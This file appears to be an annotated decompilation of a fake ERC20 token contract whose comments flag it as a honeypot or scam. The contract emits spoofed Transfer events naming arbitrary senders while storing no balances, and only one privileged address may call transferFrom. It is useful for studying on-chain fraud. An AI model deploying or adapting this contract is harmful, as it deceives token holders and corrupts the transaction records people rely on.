// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.23;

/**
 * WARNING: This appears to be a honeypot/scam token contract
 * - transferFrom only works for a specific address (_transferFrom)
 * - balanceOf always returns 0
 * - No actual token balances are stored or tracked
 * - Emits fake Transfer events without moving any tokens
 */

contract FakeToken {
    // Storage
    address private _transferFrom; // STORAGE[0x0]
    string private _signature;     // STORAGE[0x1]
    
    // Hardcoded values (not in storage)
    uint256 private constant TOTAL_SUPPLY = 0x16cd9fdb90ec9d5; // ~101 million tokens
    uint8 private constant DECIMALS = 6;
    
    // Events
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    // ERC20 Basic Interface
    
    function name() public pure returns (string memory) {
        // Returns empty string - not implemented
        return "";
    }
    
    function symbol() public pure returns (string memory) {
        // Returns empty string - not implemented
        return "";
    }
    
    function decimals() public pure returns (uint8) {
        return DECIMALS;
    }
    
    function totalSupply() public pure returns (uint256) {
        return TOTAL_SUPPLY;
    }
    
    function balanceOf(address /*account*/) public pure returns (uint256) {
        // Always returns 0 - RED FLAG
        return 0;
    }
    
    function transfer(address recipient, uint256 amount) public returns (bool) {
        // Emits event but doesn't actually transfer anything
        emit Transfer(tx.origin, recipient, amount);
        return true;
    }
    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public returns (bool) {
        // Only works if transaction origin matches stored address - RED FLAG
        require(tx.origin == _transferFrom, "Unauthorized");
        
        // Emits event but doesn't actually transfer anything
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    // Custom getter functions (duplicates with underscore prefix)
    
    function _name() public pure returns (string memory) {
        return "";
    }
    
    function _symbol() public pure returns (string memory) {
        return "";
    }
    
    function _decimals() public pure returns (uint8) {
        return DECIMALS;
    }
    
    function _totalSupply() public pure returns (uint256) {
        return TOTAL_SUPPLY;
    }
    
    function signature() public view returns (string memory) {
        return _signature;
    }
    
    // Fallback - rejects all other calls
    fallback() external payable {
        revert();
    }
    
    receive() external payable {
        revert();
    }
}